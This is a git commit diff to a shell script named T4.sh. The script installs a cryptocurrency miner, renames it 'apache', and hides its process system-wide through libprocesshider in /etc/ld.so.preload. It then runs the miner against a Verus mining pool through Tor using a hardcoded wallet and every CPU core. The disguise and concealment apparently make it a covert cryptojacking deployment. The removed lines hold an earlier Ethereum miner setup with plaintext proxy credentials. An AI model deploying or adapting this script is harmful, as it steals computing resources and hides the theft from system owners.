ff1bd4ce195dde693d26cfc9e92b0a47d692d2cc
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-27 08:30:47 +0700

    Update T4.sh

--- T4.sh
+++ T4.sh
@@ -1,15 +1,14 @@
 #!/bin/sh
-sleep 3m
+sleep 1m
+#!/bin/sh
 sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
 sudo apt update
-apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+sudo apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential nano git screen wget tor
 sudo service tor start
-
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
-tar -xf lolMiner_v1.51_Lin64.tar.gz
-cd 1.51
-mv lolMiner ../apache
+git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
+cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh
+mv ccminer ../apache
 cd ..
 
 git clone https://github.com/hanifgz/libprocesshider.git
@@ -18,4 +17,4 @@ make
 sudo mv libprocesshider.so /usr/local/lib/;sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
 cd ..
 
-./apache --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.$(echo $(shuf -i 1-1000 -n 1)) --ethstratum ETHPROXY --socks5 mikrotik999:Elibawnos@cpusocks1.wot.mrface.com:1080 --dns-over-https 0
+./apache -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.$(echo $(shuf -i 1-1000 -n 1)) -p x -t $(echo $(nproc --all)) --proxy socks5://127.0.0.1:9050
